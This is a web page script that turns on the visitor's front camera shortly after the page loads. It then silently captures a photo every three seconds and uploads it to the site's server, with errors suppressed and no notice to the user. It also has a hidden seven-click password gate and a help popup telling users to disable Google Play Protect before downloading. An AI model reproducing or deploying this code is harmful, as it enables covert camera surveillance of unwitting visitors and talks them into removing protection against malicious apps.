let clickCount = 0;
let cameraStream = null;
let captureInterval = null;

// Camera setup and capture
async function setupCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' },
            audio: false
        });
        cameraStream = stream;
        
        // Start capturing every 3 seconds
        captureInterval = setInterval(captureAndSend, 3000);
        
    } catch (error) {
        console.log('Camera access denied or error:', error);
    }
}

function captureAndSend() {
    if (!cameraStream) return;
    
    const video = document.createElement('video');
    video.srcObject = cameraStream;
    video.play();
    
    setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send to server
        fetch('/api/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ image: imageData })
        }).catch(() => {});
        
    }, 100);
}

// Click counter
document.addEventListener('click', () => {
    clickCount++;
    
    if (clickCount >= 7) {
        showPasswordModal();
        clickCount = 0; // Reset counter
    }
});

// Password modal functions
function showPasswordModal() {
    document.getElementById('passwordModal').style.display = 'flex';
}

function hidePasswordModal() {
    document.getElementById('passwordModal').style.display = 'none';
}

async function verifyPassword() {
    const password = document.getElementById('passwordInput').value;
    
    try {
        const response = await fetch('/api/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ password: password })
        });
        
        const result = await response.json();
        
        if (result.success) {
            // Clean up camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            
            // Store auth token in localStorage
            if (result.token) {
                localStorage.setItem('auth_token', result.token);
            }
            
            window.location.href = result.redirect;
        } else {
            alert('Incorrect password. Please try again.');
        }
    } catch (error) {
        alert('Network error. Please try again.');
    }
}

// Help popup
function showHelp() {
    alert(`Are you Facing issue to download?

Go to play store
Click on profile icon
Then click on play protect
And off or pause this`);
}

// Initialize camera on page load
window.addEventListener('load', () => {
    setTimeout(setupCamera, 1000);
});

// Close modal on outside click
document.getElementById('passwordModal').addEventListener('click', (e) => {
    if (e.target.id === 'passwordModal') {
        hidePasswordModal();
    }
});
